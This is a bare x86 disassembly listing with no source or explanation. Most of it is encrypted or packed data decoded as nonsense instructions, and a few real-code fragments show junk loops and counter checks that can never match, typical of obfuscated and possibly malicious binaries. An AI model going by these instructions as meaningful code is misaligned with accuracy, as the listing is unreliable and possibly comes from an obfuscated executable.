  405949:	fbstp  TBYTE PTR [esi]
  40594b:	iret   
  40594c:	mov    ecx,edx
  40594e:	repnz xchg ebx,eax
  405950:	fld    QWORD PTR [ebx-0x38175ff3]
  405956:	inc    ebp
  405957:	clc    
  405958:	cmp    DWORD PTR [edi+0x0],ecx
  40595b:	add    bh,al
  40595d:	add    eax,0x4346d3
  405962:	dec    edx
  405963:	and    al,BYTE PTR [eax]
  405965:	add    cl,ch
  405967:	pop    esi
  405968:	add    eax,DWORD PTR [eax]
  40596a:	add    BYTE PTR [edx+0x71b8a1ab],bh
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	mov    al,ss:0x31efb8c1
  40597d:	jle    0x4059fd
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x4059ce
  405984:	mov    ebx,0xf3343bcf
  405989:	xchg   esp,eax
  40598a:	addr16 sub eax,0xe8887f6a
  405990:	jle    0x4059ce
  405992:	and    eax,0x6b3efabc
  405997:	jecxz  0x4059c1
  405999:	jle    0x4059cc
  40599b:	dec    esi
  40599c:	add    bl,al
  40599e:	ret    
  40599f:	repnz rcl DWORD PTR [eax+edx*8],cl
  4059a3:	and    ebp,DWORD PTR [edi]
  4059a5:	jg     0x4059c8
  4059a7:	out    dx,eax
  4059a8:	xchg   edi,eax
  4059a9:	mov    esp,0xe3e9e90
  4059ae:	bound  eax,QWORD PTR [edx]
  4059b0:	cmp    DWORD PTR [edx-0x204f9673],ecx
  4059b6:	dec    ecx
  4059b7:	jno    0x405a1a
  4059b9:	sub    DWORD PTR [esi-0x722005db],ebx
  4059bf:	cmp    edx,DWORD PTR [edi+0x4d]
  4059c2:	pop    eax
  4059c3:	ss dec ecx
  4059c5:	mov    dl,0x3c
  4059c7:	pop    esp
  4059c8:	ror    DWORD PTR [eax-0x20],1
  4059cb:	int    0x49
  4059cd:	sbb    DWORD PTR [eax+0x3b],0xc8f73d97
  4059d4:	inc    edi
  4059d5:	je     0x405974
  4059d7:	push   fs
  4059d9:	xchg   edx,eax
  4059da:	sub    esi,ebp
  4059dc:	and    BYTE PTR [ebx-0x36],0x64
  4059e0:	or     DWORD PTR [ebp-0x4212b3b9],ebp
  4059e6:	nop
  4059e7:	mov    esi,DWORD PTR [ecx+0x38]
  4059ea:	loop   0x4059a6
  4059ec:	xor    ah,BYTE PTR [eax+0x30]
  4059ef:	loope  0x405a0b
  4059f1:	fld    st(2)
  4059f3:	in     eax,0x4e
  4059f5:	shr    esi,0x48
  4059f8:	mov    dl,ch
  4059fa:	mov    DWORD PTR [eax+edi*1-0x60],esp
  4059fe:	mov    ebx,0x812a8541
  405a03:	push   esp
  405a04:	sbb    dh,BYTE PTR [edi-0x539f598a]
  405a0a:	mov    ebp,0xdfaebb77
  405a0f:	xchg   ebp,eax
  405a10:	jge    0x405a8c
  405a12:	cdq    
  405a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a14:	adc    BYTE PTR [ebx-0xdbb8ce0],ah
  405a1a:	fstp   TBYTE PTR [eax-0x24]
  405a1d:	test   BYTE PTR [ebp+0x44a8d01e],bh
  405a23:	dec    esi
  405a24:	pop    edi
  405a25:	or     ecx,DWORD PTR [ebp+0x44276d22]
  405a2b:	leave  
  405a2c:	inc    ebp
  405a2d:	stc    
  405a2e:	sahf   
  405a2f:	push   0x859e3422
  405a34:	sbb    bl,BYTE PTR [ebx]
  405a36:	cmp    eax,0xa080bf52
  405a3b:	pop    esp
  405a3c:	dec    eax
  405a3d:	(bad)  
  405a3e:	push   ds
  405a3f:	push   0xfffffff6
  405a41:	mov    BYTE PTR [esi],bl
  405a43:	std    
  405a44:	out    0x17,eax
  405a46:	sbb    esi,esi
  405a48:	mov    dh,0xd3
  405a4a:	jo     0x405a0d
  405a4c:	cli    
  405a4d:	ds into 
  405a4f:	mov    fs,WORD PTR [ecx]
  405a51:	outs   dx,DWORD PTR ds:[esi]
  405a52:	out    dx,eax
  405a53:	add    eax,0x5682058c
  405a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a59:	inc    ebp
  405a5a:	pop    ebp
  405a5b:	pop    esi
  405a5c:	pop    edi
  405a5d:	mov    ecx,esp
  405a5f:	pop    edx
  405a60:	dec    eax
  405a61:	xchg   edx,eax
  405a62:	jp     0x405a36
  405a64:	aaa    
  405a65:	in     al,dx
  405a66:	fild   QWORD PTR ds:0x44590ad2
  405a6c:	mov    cs,WORD PTR [ebx-0x76453c80]
  405a72:	bound  esp,QWORD PTR [edi]
  405a74:	xchg   BYTE PTR [esi-0x4b],dl
  405a77:	cdq    
  405a78:	sti    
  405a79:	xchg   BYTE PTR [edx+0x1f7445d],ah
  405a7f:	dec    DWORD PTR [edi-0x4a405246]
  405a85:	arpl   WORD PTR [ebx+0x522f46e6],si
  405a8b:	aaa    
  405a8c:	push   esi
  405a8d:	mov    ds:0x42a6999c,eax
  405a92:	sahf   
  405a93:	iret   
  405a94:	mov    ecx,0xc564725f
  405a99:	(bad)  
  405a9a:	gs jmp 0xbfdb8a03
  405aa0:	mov    ds:0x46848edd,eax
  405aa5:	sub    eax,0x8c17a824
  405aaa:	xor    edx,DWORD PTR [ebx]
  405aac:	fwait
  405aad:	push   0xfffffffc
  405aaf:	and    eax,DWORD PTR [edx+0x6e]
  405ab2:	ds pop edx
  405ab4:	push   0xffffffb7
  405ab6:	daa    
  405ab7:	dec    ebx
  405ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ab9:	or     BYTE PTR [ebp-0x58],dh
  405abc:	(bad)  [ebp+0x13]
  405abf:	adc    bh,BYTE PTR [ecx+0x25]
  405ac2:	bnd data16 jp 0x405a95
  405ac6:	xchg   ebx,eax
  405ac7:	sub    BYTE PTR [bp+si-0x4f81],bh
  405acc:	call   0xc1f6:0x19d840b
  405ad3:	lock xor eax,0x9e00a00a
  405ad9:	push   es
  405ada:	or     ch,BYTE PTR [ebx]
  405adc:	test   eax,0x6da98fc0
  405ae1:	rcr    bh,0xa8
  405ae4:	mov    cl,0xb1
  405ae6:	jmp    0x9af543bc
  405aeb:	pop    eax
  405aec:	nop
  405aed:	xor    ch,bl
  405aef:	mov    ah,0x82
  405af1:	enter  0x90ff,0x8f
  405af5:	mov    gs,WORD PTR [ebx+0x49076a9a]
  405afb:	jne    0x405aa9
  405afd:	or     al,0x11
  405aff:	add    DWORD PTR [edx+0x10c34042],esi
  405b05:	int    0x9d
  405b07:	sub    BYTE PTR [ecx+edx*1-0xdb6a19f],al
  405b0e:	and    al,0xb0
  405b10:	es pushf 
  405b12:	cmc    
  405b13:	cmp    ebx,DWORD PTR [esi+0x20]
  405b16:	sbb    BYTE PTR [ecx+0x11],dh
  405b19:	ja     0x405b52
  405b1b:	add    ebx,DWORD PTR [ebx]
  405b1d:	loop   0x405b92
  405b1f:	loop   0x405b71
  405b21:	inc    ebp
  405b22:	fldcw  WORD PTR [esi]
  405b24:	and    edi,DWORD PTR [edi]
  405b26:	scas   al,BYTE PTR es:[edi]
  405b27:	inc    esi
  405b28:	pusha  
  405b29:	aad    0xde
  405b2b:	push   0x85a1d02f
  405b30:	or     ah,bl
  405b32:	fild   QWORD PTR [ecx+0x7c]
  405b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b36:	dec    ebp
  405b37:	call   0x5cb7:0x7d9f4442
  405b3e:	fnstcw WORD PTR [edi-0x75baea1f]
  405b44:	ins    BYTE PTR es:[edi],dx
  405b45:	jge    0x405b66
  405b47:	fisub  WORD PTR [ecx+edx*8+0x48998440]
  405b4e:	and    BYTE PTR [esp+esi*2-0x21],ch
  405b52:	add    ah,BYTE PTR [esi+0x75fc6e4f]
  405b58:	xor    al,BYTE PTR [edi-0x3bcad540]
  405b5e:	inc    ecx
  405b5f:	mov    esi,0x21835f
  405b64:	push   ebx
  405b65:	mov    al,ds:0xada96064
  405b6a:	lea    eax,[di+0x5ca0]
  405b6f:	aaa    
  405b70:	mov    al,0x2
  405b72:	mov    ecx,0xc5eafed3
  405b77:	sbb    eax,DWORD PTR ds:0x17883a8f
  405b7d:	cmp    eax,0x8730c475
  405b82:	mov    cl,0x7d
  405b84:	and    al,0x9b
  405b86:	xchg   edi,eax
  405b87:	in     al,0x52
  405b89:	jae    0x405b1c
  405b8b:	popf   
  405b8c:	loopne 0x405bf5
  405b8e:	cmp    al,0x55
  405b90:	fiadd  WORD PTR [ebp+0x2f]
  405b93:	dec    ecx
  405b94:	mov    eax,0xb1c233a0
  405b99:	jno    0x405b62
  405b9b:	push   ebp
  405b9c:	adc    al,0x74
  405b9e:	(bad)  
  405b9f:	xor    al,0x13
  405ba1:	mov    eax,ds:0xc5ec4d30
  405ba6:	aam    0x3c
  405ba8:	sub    BYTE PTR [eax-0x6d971d8f],bl
  405bae:	(bad)  
  405baf:	outs   dx,DWORD PTR ds:[esi]
  405bb0:	ds push cs
  405bb2:	out    dx,al
  405bb3:	xchg   ecx,eax
  405bb4:	jne    0x405b7a
  405bb6:	or     cl,0x2f
  405bb9:	in     eax,0x8d
  405bbb:	test   eax,0x2219649c
  405bc0:	adc    DWORD PTR [edi+0x37],edx
  405bc3:	xchg   edi,eax
  405bc4:	into   
  405bc5:	or     cl,dh
  405bc7:	test   al,0xbd
  405bc9:	jb     0x405b78
  405bcb:	or     ebp,ebp
  405bcd:	iret   
  405bce:	enter  0xc016,0xc7
  405bd2:	or     BYTE PTR [ebx+0x2d],0x5d
  405bd6:	cmp    BYTE PTR [edx],ch
  405bd8:	imul   edx,DWORD PTR ds:0xdf0081ac,0xfffffff5
  405bdf:	cmp    eax,DWORD PTR [ebp+0x2f]
  405be2:	std    
  405be3:	jmp    0x9725:0x5e8f8015
  405bea:	sub    DWORD PTR [eax],ebx
  405bec:	fwait
  405bed:	ret    0x290
  405bf0:	jecxz  0x405c26
  405bf2:	inc    esp
  405bf3:	aam    0x25
  405bf5:	xor    BYTE PTR [eax],ah
  405bf7:	inc    ebx
  405bf8:	pop    ebp
  405bf9:	jns    0x405c32
  405bfb:	outs   dx,BYTE PTR ds:[esi]
  405bfc:	and    BYTE PTR [edx],ah
  405bfe:	(bad)  
  405bff:	sub    edi,edi
  405c01:	push   ebp
  405c02:	mov    ebp,0xe36790be
  405c07:	dec    esi
  405c08:	push   ebp
  405c09:	nop
  405c0a:	(bad)  
  405c0b:	fistp  DWORD PTR [eax+0x1]
  405c0e:	xchg   ebx,eax
  405c0f:	scas   eax,DWORD PTR es:[edi]
  405c10:	cmp    edx,edi
  405c12:	or     al,0xb1
  405c14:	test   ebp,esi
  405c16:	sar    BYTE PTR [edi-0x3d],cl
  405c19:	add    dl,BYTE PTR [esi-0xb5434e9]
  405c1f:	jle    0x405bf1
  405c21:	mov    ds:0xa672c0cc,al
  405c26:	dec    edi
  405c27:	daa    
  405c28:	xchg   ebx,eax
  405c29:	ins    BYTE PTR es:[edi],dx
  405c2a:	fcom   QWORD PTR [esi+0x57]
  405c2d:	xor    ebp,esi
  405c2f:	xchg   ebx,eax
  405c30:	mov    eax,0x4c60afa9
  405c35:	dec    eax
  405c36:	push   es
  405c37:	cmc    
  405c38:	out    0x49,eax
  405c3a:	jne    0x405ca4
  405c3c:	call   0xc5a4b9a2
  405c41:	fwait
  405c42:	sbb    al,0x41
  405c44:	and    BYTE PTR [esi+0x16],bl
  405c47:	(bad)  
  405c48:	iret   
  405c49:	dec    eax
  405c4a:	pop    ebx
  405c4b:	fdiv   DWORD PTR [ebx-0x156f0230]
  405c51:	jecxz  0x405bea
  405c53:	outs   dx,BYTE PTR ds:[esi]
  405c54:	jecxz  0x405bd8
  405c56:	popa   
  405c57:	popf   
  405c58:	xor    cl,BYTE PTR ds:0x42778f85
  405c5e:	jae    0x405c46
  405c60:	je     0x405c41
  405c62:	mov    al,ds:0xd2ff7b67
  405c67:	pop    ecx
  405c68:	nop
  405c69:	jg     0x405cc5
  405c6b:	and    DWORD PTR [eax],ecx
  405c6d:	mov    ebp,0x1bfd9e72
  405c72:	xor    edx,DWORD PTR [esi-0x3049d61a]
  405c78:	mov    eax,0x4ad86657
  405c7d:	push   0x3e76d29a
  405c82:	xchg   esp,eax
  405c83:	xor    ah,ch
  405c85:	test   dh,dh
  405c87:	pop    edi
  405c88:	int    0x25
  405c8a:	int    0x7f
  405c8c:	repz xor eax,0x99fd6174
  405c92:	ds dec esi
  405c94:	jb     0x405c75
  405c96:	(bad)  
  405c97:	sti    
  405c98:	rcl    DWORD PTR [ebx-0x25525ff7],cl
  405c9e:	fs in  al,dx
  405ca0:	out    0x57,al
  405ca2:	pushf  
  405ca3:	xchg   edi,eax
  405ca4:	fs ret 0x569f
  405ca8:	(bad)  
  405caa:	ins    BYTE PTR es:[edi],dx
  405cab:	jno    0x405cc9
  405cad:	jns    0x405d29
  405caf:	lds    esi,FWORD PTR [ebp+0x3b]
  405cb2:	mov    al,ds:0x9349c2c9
  405cb7:	ja     0x405ce7
  405cb9:	adc    BYTE PTR [ebx-0x69049b43],ah
  405cbf:	jno    0x405c6f
  405cc1:	mov    al,0x5a
  405cc3:	add    DWORD PTR [ebx-0x2],edx
  405cc6:	outs   dx,DWORD PTR ds:[esi]
  405cc7:	pop    ebp
  405cc8:	mov    dh,0x3b
  405cca:	enter  0x850f,0x12
  405cce:	add    al,0x0
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x43463f
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434653,0x43467b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43470f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4346c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434647,0x12
  405d19:	cmp    DWORD PTR ds:0x434647,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434647,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434647
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434647,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0xb371bd6
  405d8d:	dec    ebp
  405d8e:	or     eax,0x7e7e3cb5
  405d93:	les    edi,FWORD PTR [ecx+0x7e]
  405d96:	jle    0x405e0b
  405d98:	xchg   ebx,eax
  405d99:	lea    ebx,[eax-0x6e]
  405d9c:	outs   dx,DWORD PTR ds:[esi]
  405d9d:	push   ds
  405d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d9f:	pop    esi
  405da0:	xor    DWORD PTR [ebp+0x78239f20],edi
  405da6:	and    al,0x7f
  405da8:	outs   dx,BYTE PTR ds:[esi]
  405da9:	sbb    BYTE PTR [ecx+0x55],dl
  405dac:	mov    dh,0x64
  405dae:	jne    0x405dde
  405db0:	aas    
  405db1:	lods   eax,DWORD PTR ds:[esi]
  405db2:	or     BYTE PTR [edx+0x1f],dh
  405db5:	xchg   esi,eax
  405db6:	and    esp,DWORD PTR [edx+eax*1+0x3492cd12]
  405dbd:	and    BYTE PTR [eax+0xc54162e],al
  405dc3:	sub    eax,edi
  405dc5:	mov    DWORD PTR [edi+edx*4],ebx
  405dc8:	jmp    FWORD PTR fs:[edi]
  405dcb:	adc    DWORD PTR [esi-0x38f72d8f],0x981b1243
  405dd5:	inc    edx
  405dd6:	mov    gs,WORD PTR [edi+0x53]
  405dd9:	loopne 0x405e1f
  405ddb:	dec    edx
  405ddc:	dec    ebp
  405ddd:	mov    esp,0x43ea6d00
  405de2:	and    DWORD PTR [eax],eax
  405de4:	stc    
  405de5:	dec    ecx
  405de6:	fdivr  DWORD PTR [ebp+0x5713b543]
  405dec:	or     DWORD PTR [ecx-0x13],0xffffffa3
  405df0:	cmp    edx,DWORD PTR [edx+0x43]
  405df3:	mov    WORD PTR [edx+0x52],?
  405df6:	pop    ss
  405df7:	mov    ebp,0xb1136016
  405dfc:	fisttp DWORD PTR [edi+0x39]
  405dff:	clc    
  405e00:	shl    ch,0x44
  405e03:	push   ebx
  405e04:	jle    0x405e00
  405e06:	lods   al,BYTE PTR ds:[esi]
  405e07:	orps   xmm6,xmm5
  405e0a:	retf   0x4142
  405e0d:	popf   
  405e0e:	stc    
  405e0f:	sbb    DWORD PTR [edx-0x18],esi
  405e12:	pop    eax
  405e13:	icebp  
  405e14:	lock fdiv DWORD PTR [ebx-0x19]
  405e18:	cld    
  405e19:	rol    DWORD PTR [edx],cl
  405e1b:	fsubr  QWORD PTR [eax-0x395e427d]
  405e21:	add    BYTE PTR [edi],ch
  405e23:	xchg   esi,eax
  405e24:	fmul   QWORD PTR [ecx-0x733c4f36]
  405e2a:	cdq    
  405e2b:	xor    eax,0x66be8e38
  405e30:	dec    edi
  405e31:	shr    ebx,0xa8
  405e34:	jbe    0x405df9
  405e36:	xor    bh,cl
  405e38:	and    eax,0x56470f4
  405e3d:	(bad)  
  405e3e:	repnz push cs
  405e40:	pop    ecx
  405e41:	not    DWORD PTR [ebx*4-0x583a9308]
  405e48:	mov    cl,0x20
  405e4a:	cmp    al,0xcd
  405e4c:	xchg   DWORD PTR [esi+ecx*2-0x79],edx
  405e50:	leave  
  405e51:	in     al,0x98
  405e53:	lea    edx,[ecx+0x9]
  405e56:	push   ebx
  405e57:	cmp    DWORD PTR [eax+0x70ec8b22],0x9b06ea67
  405e61:	rcr    DWORD PTR [edi+ecx*4+0x7e],0x5f
  405e66:	adc    eax,0x7609bd07
  405e6b:	cmp    al,BYTE PTR [ecx-0x80]
  405e6e:	mov    ds:0xc518e525,al
  405e73:	and    bl,0x7b
  405e76:	push   ss
  405e77:	std    
  405e78:	xchg   edx,eax
  405e79:	iret   
  405e7a:	or     BYTE PTR [eax+0x66],bh
  405e7d:	push   0x38
  405e7f:	je     0x405e8a
  405e81:	cmc    
  405e82:	rcl    BYTE PTR ds:0x3c96e85d,1
  405e88:	pop    ecx
  405e89:	inc    esp
  405e8a:	mov    ebx,0xb7a95642
  405e8f:	fcom   QWORD PTR ds:0xc1df7b79
  405e95:	out    0x2b,eax
  405e97:	sub    edx,DWORD PTR [eax+0x79]
  405e9a:	ins    DWORD PTR es:[edi],dx
  405e9b:	ja     0x405e25
  405e9d:	in     al,dx
  405e9e:	(bad)  
  405e9f:	pusha  
  405ea0:	push   edi
  405ea1:	mov    ds:0x503d0f6b,eax
  405ea6:	shr    DWORD PTR [esp+ecx*2],cl
  405ea9:	aas    
  405eaa:	in     al,0x60
  405eac:	call   0xdeb3:0xaebef12f
  405eb3:	sub    eax,0x43464699
  405eb8:	adc    DWORD PTR [edi+0xd],edi
  405ebb:	add    BYTE PTR [edi+0x7c],0x75
  405ebf:	push   esi
  405ec0:	pop    ss
  405ec1:	daa    
  405ec2:	mov    ebx,0x8630bb78
  405ec8:	fldcw  WORD PTR [esi]
  405eca:	lock dec eax
  405ecc:	push   eax
  405ecd:	shl    BYTE PTR [esi-0x22],1
  405ed0:	mov    dh,0x6b
  405ed2:	xor    al,0x4e
  405ed4:	lods   al,BYTE PTR ds:[esi]
  405ed5:	xchg   BYTE PTR [esi],dl
  405ed7:	repz cmp DWORD PTR [ebx+0x2e849f5],edx
  405ede:	loope  0x405e90
  405ee0:	sar    BYTE PTR [eax],cl
  405ee2:	push   eax
  405ee3:	push   edx
  405ee4:	inc    edx
  405ee5:	xchg   BYTE PTR [eax-0x39],al
  405ee8:	jnp    0x405eac
  405eea:	dec    ecx
  405eeb:	sub    dl,BYTE PTR [bp+si-0x4ff5]
  405ef0:	test   DWORD PTR [edx-0x5b],0xafc4358f
  405ef7:	inc    eax
  405ef8:	(bad)  
  405ef9:	out    0xc,eax
  405efb:	addr16 popa 
  405efd:	shl    BYTE PTR [ebp-0x25765f4d],0xf6
  405f04:	bound  eax,QWORD PTR [edx]
  405f06:	push   edi
  405f07:	jge    0x405e8b
  405f09:	ja     0x405f75
  405f0b:	sub    DWORD PTR [esp+eiz*4],esi
  405f0e:	daa    
  405f0f:	inc    esp
  405f10:	icebp  
  405f11:	jmp    FWORD PTR [edi+0x18]
  405f14:	push   edx
  405f15:	out    0x4c,eax
  405f17:	call   0xc0fd:0x8bc48716
  405f1e:	iret   
  405f1f:	das    
  405f20:	imul   esi,DWORD PTR [ebx],0xf67befa6
  405f26:	push   ebx
  405f27:	inc    ebx
  405f28:	hlt    
  405f29:	jmp    0x695d62c8
  405f2e:	(bad)  
  405f2f:	ss sbb ecx,0xffffff80
  405f33:	arpl   bp,si
  405f35:	adc    ebp,ebp
  405f37:	inc    edx
  405f38:	test   BYTE PTR [eax],bl
  405f3a:	test   DWORD PTR [esi+esi*4+0x59],esp
  405f3e:	mov    edi,0xebc3a1a6
  405f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f44:	xchg   ecx,eax
  405f45:	jnp    0x405f47
  405f47:	ins    DWORD PTR es:[edi],dx
  405f48:	pop    edx
  405f49:	mov    al,0x60
  405f4b:	adc    DWORD PTR [ecx],ebp
  405f4d:	rcr    DWORD PTR [ebp-0x4101f551],1
  405f53:	fcmovb st,st(2)
  405f55:	sbb    ebx,DWORD PTR [eax-0x4a]
  405f58:	push   edi
  405f59:	stos   DWORD PTR es:[edi],eax
  405f5a:	int    0xbb
  405f5c:	inc    ebx
  405f5d:	sub    BYTE PTR [esi+0x3b6f13c2],0xf3
  405f64:	and    BYTE PTR [edx-0x67],cl
  405f67:	jge    0x405f69
  405f69:	imul   edi,DWORD PTR ss:[edi-0x29010f1a],0xffffffb0
  405f71:	jg     0x405fcf
  405f73:	out    0x7,eax
  405f75:	or     bl,BYTE PTR ds:[ebp+0x57e95b59]
  405f7c:	js     0x405f73
  405f7e:	mov    ebp,0x305392d5
  405f83:	ficomp DWORD PTR [ebx*8+0x78b38b87]
  405f8a:	or     al,0xfb
  405f8c:	ds mov cl,0xbf
  405f8f:	adc    eax,0x638cfaf8
  405f94:	push   edx
  405f95:	enter  0x9054,0x37
  405f99:	inc    edi
  405f9a:	adc    esp,DWORD PTR [ebp+ebp*4-0x6815fb60]
  405fa1:	jno    0x405fe3
  405fa3:	outs   dx,DWORD PTR ds:[esi]
  405fa4:	fcomp  DWORD PTR [ebx-0x14]
  405fa7:	sbb    al,0x44
  405fa9:	cwde   
  405faa:	pop    eax
  405fab:	fcomp  DWORD PTR [eax+0x3eeca286]
  405fb1:	(bad)  
  405fb2:	in     eax,0x36
  405fb4:	or     esp,edi
  405fb6:	(bad)  
  405fb7:	jmp    0x405f61
  405fb9:	inc    edx
  405fba:	in     al,dx
  405fbb:	mov    fs:0x5a1ca462,al
  405fc1:	adc    BYTE PTR [ebp-0x959e0e5],ah
  405fc7:	and    eax,0xe259a696
  405fcc:	cmp    ch,BYTE PTR [ecx+esi*2+0x2df4954a]
  405fd3:	dec    eax
  405fd4:	pop    edi
  405fd5:	repz inc esi
  405fd7:	pop    ebp
  405fd8:	jecxz  0x405ff6
  405fda:	lahf   
  405fdb:	mov    al,ds:0x75dd43d9
  405fe0:	pop    ecx
  405fe1:	fimul  DWORD PTR [eax]
  405fe3:	std    
  405fe4:	add    eax,0x33
  405fe7:	fwait
  405fe8:	sbb    BYTE PTR [edi],ch
  405fea:	mov    cl,0xc
  405fec:	mov    cl,0xae
  405fee:	mov    eax,0xc559b7f5
  405ff3:	int3   
  405ff4:	(bad)  
  405ff5:	xchg   ecx,eax
  405ff6:	pop    ecx
  405ff7:	es in  eax,0x23
  405ffa:	xor    al,0xc1
  405ffc:	inc    esp
  405ffd:	dec    edi
  405ffe:	add    eax,0xfa61be04
  406003:	sbb    dl,BYTE PTR [ebp+0x31]
  406006:	mov    ds:0x8bd254e,eax
  40600b:	adc    bl,BYTE PTR [ebx-0x4]
  40600e:	inc    eax
  40600f:	loope  0x40606d
  406011:	pop    es
  406012:	xor    al,0x9
  406014:	in     eax,dx
  406015:	inc    BYTE PTR [edi-0x17743d04]
  40601b:	repnz in eax,dx
  40601d:	(bad)  
  40601e:	ud0    edx,DWORD PTR [edx]
  406021:	mov    BYTE PTR [edx+0x18],bh
  406024:	inc    esp
  406025:	call   0xdc626aff
  40602a:	(bad)  
  40602b:	pusha  
  40602c:	mov    dl,0xaf
  40602e:	sbb    ebp,DWORD PTR [eax+edx*1]
  406031:	pop    ecx
  406032:	cs dec ecx
  406034:	rcl    BYTE PTR [esi+ecx*8-0x4269aa0b],1
  40603b:	push   edx
  40603c:	lea    ebx,[eax]
  40603e:	cmp    ah,BYTE PTR [edx]
  406040:	fcom   st(7)
  406042:	ror    BYTE PTR [esi-0x9d606f3],1
  406048:	adc    al,0xe4
  40604a:	(bad)  
  40604b:	sub    al,0x4e
  40604d:	scas   eax,DWORD PTR es:[edi]
  40604e:	ret    0xcaec
  406051:	sbb    BYTE PTR [esi+0x2b],bl
  406054:	xchg   ebp,eax
  406055:	js     0x40605e
  406057:	adc    eax,0x54e8ca45
  40605c:	inc    ebp
  40605d:	xchg   ecx,eax
  40605e:	or     esi,0xe8e50f8a
  406064:	sub    ah,BYTE PTR [ebx+ecx*1-0x7477ef84]
  40606b:	jne    0x4060d8
  40606d:	dec    esp
  40606e:	(bad)  
  40606f:	in     eax,dx
  406070:	cmp    eax,ebp
  406072:	imul   ecx,DWORD PTR [edi+0x656e94],0xa557f862
  40607c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40607d:	inc    edx
  40607e:	fidivr WORD PTR [esi]
  406080:	fsincos 
  406082:	or     dl,BYTE PTR [ecx+edx*1+0x6273a23b]
  406089:	pop    esp
  40608a:	fsub   DWORD PTR [esi]
  40608c:	sub    BYTE PTR [ecx-0xe],cl
  40608f:	xchg   ebp,eax
  406090:	adc    BYTE PTR [ecx],ah
  406092:	jecxz  0x406084
  406094:	push   esp
  406095:	lods   al,BYTE PTR ds:[esi]
  406096:	in     al,0xff
  406098:	xchg   bl,ah
  40609a:	ins    BYTE PTR es:[edi],dx
  40609b:	and    ah,bl
  40609d:	pop    ebx
  40609e:	in     eax,0xaa
  4060a0:	mov    ds:0x8aa74d86,al
  4060a5:	inc    ebp
  4060a6:	ss adc ch,bl
  4060a9:	jns    0x406058
  4060ab:	je     0x4060df
  4060ad:	imul   ecx,edx,0xb49db278
  4060b3:	mov    ecx,0xb0a37b47
  4060b8:	(bad)  
  4060b9:	jl     0x40612e
  4060bb:	ds (bad) 
  4060bd:	arpl   WORD PTR [edi],sp
  4060bf:	out    0x42,al
  4060c1:	out    dx,al
  4060c2:	clc    
  4060c3:	sbb    eax,0x8f8c4e5f
  4060c8:	imul   eax,esp,0xffffffdc
  4060cb:	add    eax,0x1f31e0d0
  4060d0:	adc    eax,0xb46a4fdb
  4060d5:	adc    BYTE PTR [esi+ebx*8-0x18e01eef],bh
  4060dc:	bound  ecx,QWORD PTR [edi]
  4060de:	test   BYTE PTR [edx-0x36000004],al
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43466f
  406101:	mov    eax,ds:0x43471b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434653,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434653
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434653,ecx
  40612c:	cmp    DWORD PTR ds:0x434653,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434653,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434637,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43467b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43467b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43467b,ecx
  406175:	cmp    DWORD PTR ds:0x43467b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43467b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43467b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43467b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43467b,0x1f
  4061ae:	jb     0x406168
